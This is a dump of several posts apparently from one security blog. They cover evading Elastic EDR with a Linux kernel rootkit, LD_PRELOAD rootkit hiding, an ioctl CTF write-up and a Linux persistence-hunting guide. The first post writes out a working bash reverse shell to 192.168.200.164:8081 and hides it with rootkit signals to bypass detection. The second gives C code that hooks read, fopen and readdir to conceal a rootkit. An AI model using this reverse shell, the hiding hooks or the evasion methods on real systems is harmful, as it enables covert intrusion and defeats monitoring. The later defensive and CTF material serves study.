Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to 